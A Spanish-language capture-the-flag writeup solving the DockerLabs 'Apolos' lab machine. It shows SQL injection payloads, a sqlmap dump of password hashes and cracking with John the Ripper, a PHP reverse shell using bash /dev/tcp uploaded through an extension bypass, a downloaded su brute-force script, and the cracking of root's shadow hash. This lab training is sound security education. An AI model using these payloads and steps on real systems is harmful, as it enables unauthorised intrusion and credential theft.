En la máquina **Apolos** de **DockerLabs** explotaremos una **SQLi** basada en errores, aunque luego necesitaremos de la ayuda de **SQLmap** para encontrar credenciales de la **bbdd**, obtendremos accesoa a la máquina por la subida de una **Reverse Shell** en el panel de administración de la web, y escalaremos privilegios por la explotación del comando **su** y la utilización de **John The Ripper**.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

## **Reconocimiento**

Lo primero que tenemos que hacer es desplegar la máquina.

```bash
sudo bash auto_deploy.sh apolos.tar
```

![picture](/assets/images/dockerlabs/apolo1.png){: w="600" h="300" }

Una vez la máquina desplegada, realizo un escaneo con *NMAP* para comprobar los puertos abiertos.

```bash
nmap -p- --open --min-rate 5000 172.17.0.2 -n -Pn -oN allports
```

Comprobamos que solo tiene abierto el puerto **80** con el servicio **HTTP**.

![picture](/assets/images/dockerlabs/apolo2.png){: w="600" h="300" }

Vamos al navegador web para comprobar que está corriendo por el servicio.

Parece una tienda de productos de *'Apple'*.

![picture](/assets/images/dockerlabs/apolo3.png)

Buscando en la web, encontramos un panel de *login*.

Intentando probar credenciales comunes, inyectar **SQLi** en los 2 campos, no obtengo resultado.

![picture](/assets/images/dockerlabs/apolo4.png)

En la web también encuentro un buscador que funciona, podría ser otro campo a probar.

![picture](/assets/images/dockerlabs/apolo5.png)

A continuación, voy a realizar **Fuzzing** con **Gobuster** para intentar encontrar archivos y directorios que cuelguen de la web.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php -t 50 -b 403,404 --no-error
```

Y encontramos los siguientes.

![picture](/assets/images/dockerlabs/apolo6.png)

Buscando a través de los directorios no encuentro nada interesante.

Me registro con las credenciales "*prueba:prueba*" y veo que el registro ha sido exitoso.

![picture](/assets/images/dockerlabs/apolo7.png)

![picture](/assets/images/dockerlabs/apolo8.png)

Pruebo a acceder con las credenciales y obtengo acceso.

![picture](/assets/images/dockerlabs/apolo9.png)

En mi carrito aparece otra vez el buscador.

![picture](/assets/images/dockerlabs/apolo10.png)

Intentando introducir una **SQLI basada en errores**, descubro que cuando lo ordeno por columnas, e introduzco el ordenamiento por **6**, la web da un error.

Sabemos que hay **5** columnas.

```bash
'order by 5-- -
```

![picture](/assets/images/dockerlabs/apolo11.png)

Buscando el nombre de la base de datos, descubrimos que se llama **apple_store**.

```bash
iphone 'union select 1,database(),3,4,5-- -
```

![picture](/assets/images/dockerlabs/apolo13.png)

Intentando listar las tablas de la base de datos no soy capaz.

Intercepto la petición con **Burpsuite** para guardarla como un archivo llamado '*request*' y escanearla con **SQLmap**.

![picture](/assets/images/dockerlabs/apolo14.png)

## **Explotación**

A continuación lanzamos **SQLmap** para ver si encuentra algo.

```bash
sqlmap -r request --dbs --batch --dump
```

Y obtenemos los hashes de las contraseñas de los usuarios de la base de datos.

![picture](/assets/images/dockerlabs/apolo15.png){: w="600" h="300" }

Intentando crackear la contraseña del usuario **admin** con **John The Ripper**, obtengo la contraseña en texto claro.

![picture](/assets/images/dockerlabs/apolo16.png){: w="600" h="300" }

Accedemos al panel de **Login** con el usuario **admin** y obtenemos acceso.

![picture](/assets/images/dockerlabs/apolo17.png)

En el panel de administrador, vamos al apartado de configuración, y nos lleva a una página en la cual podemos subir un archivo, si la sanitización de la web no es correcta, podríamos intentar subir una **Webshell** o una **Reverse Shell**.

![picture](/assets/images/dockerlabs/apolo18.png)

![picture](/assets/images/dockerlabs/apolo19.png)

Creamos un archivo llamado **shell.php** con el siguiente contenido.

```php
<?php
shell_exec("bash -c 'bash -i >& /dev/tcp/Nuestra Ip/4444 0>&1'");
?>
```

Lo intentamos subir y nos aparece el siguiente mensaje, hay restricciones en las extensiones de los archivos de subida.

![picture](/assets/images/dockerlabs/apolo20.png){: w="600" h="300" }

Modificamos la extensión del archivo de **php** a **phtml** y lo enviamos con éxito.

Nos dirigimos al directorio **/uploads** encontrado anteriormente, y comprobamos que el archivo se ha subido correctamente.

![picture](/assets/images/dockerlabs/apolo21.png){: w="600" h="300" }

A continuación, para poder obtener la **Reverse Shell** abriremos un **Listener** con **ncat** en nuestra máquina local por el puerto indicado en el archivo.

```bash
nc -lnvp 4444
```

Una vez tengamos el **Listener**, clicamos sobre el archivo y obtendremos la **Shell interactiva** en nuestra terminal.

![picture](/assets/images/dockerlabs/apolo22.png){: w="600" h="300" }

Realizo un tratamiento de la **TTY** para obtener una interacción más limpia con la terminal.

```bash
script /dev/null -c bash
Ctrl_Z
stty raw -echo;fg
export SHELL=/bin/bash
export TERM=screen
stty rows 48 columns 188
reset
```

![picture](/assets/images/dockerlabs/apolo23.png){: w="600" h="300" }

Viendo el archivo **passwd** compruebo que hay 2 usuarios en el sistema, y uno de ellos es **luisillo_o** el cual habíamos obtenido anteriormente el hash de su contraseña de la base de datos. Voy a intentar crackear el hash por si hubiese reutilización de contraseñas.

![picture](/assets/images/dockerlabs/apolo24.png){: w="600" h="300" }

Intentamos realizar un movimiento lateral de usuario y no obtenemos resultado, la contraseña no es la misma.

## **Escalada de privilegios**

Después de un rato probando distintas vías de movimiento lateral entre usuarios no obtengo resultado, vamos a realizar un ataque de fuerza bruta para el comando **su** (*substitute user*) con el siguiente script de [Github](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh), también necesitaremos un diccionario, utilizaré el **Rockyou**.

Me descargo en mi máquina local tanto el script, como el diccionario, creo un servidor **HTTP** con **Python3** y me los descargo en la máquina víctima con **wget**.

- Servidor http en la máquina local

```bash
python3 -m http.server 1234
```

- Descarga desde la máquina víctima

```bash
wget http://172.17.0.1:1234/Linux-Su-Force.sh
```

```bash
wget http://172.17.0.1:1234/rockyou.txt
```

![picture](/assets/images/dockerlabs/apolo25.png)

Le damos permisos de ejecución al script.

Y si lo ejecutamos sin introducir ningún parámetro, nos indica los pasos a seguir.

![picture](/assets/images/dockerlabs/apolo26.png)

Introducimos el usuario y el diccionario.

```bash
./Linux-Su-Force.sh luisillo_o rockyou.txt
```

Y al cabo de un rato nos encuentra la contraseña.

![picture](/assets/images/dockerlabs/apolo27.png)

Comprobamos que el usuario pertenece al grupo **shadow**, con lo cual tendremos permisos de lectura del archivo **/etc/shadow**, y podremos ver los hashes de las contraseñas de los usuarios, en especial el del usuario **root**.

![picture](/assets/images/dockerlabs/apolo28.png)

![picture](/assets/images/dockerlabs/apolo29.png)

Comprobamos en la web [Hashes.com](https://hashes.com/es/tools/hash_identifier) que el hash es del tipo **Yescrypt**.

![picture](/assets/images/dockerlabs/apolo30.png)

Copiamos el hash en un archivo de texto, al estar basado en **crypt**, le decimos a **John The Ripper** que ese es el formato, y empieza la fuerza bruta.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashroot --format=crypt
```

Obtenemos la contraseña del usuario **root** al cabo de un rato.

![picture](/assets/images/dockerlabs/apolo31.png)

Y accedemos como el usuario **root**.

![picture](/assets/images/dockerlabs/apolo32.png)
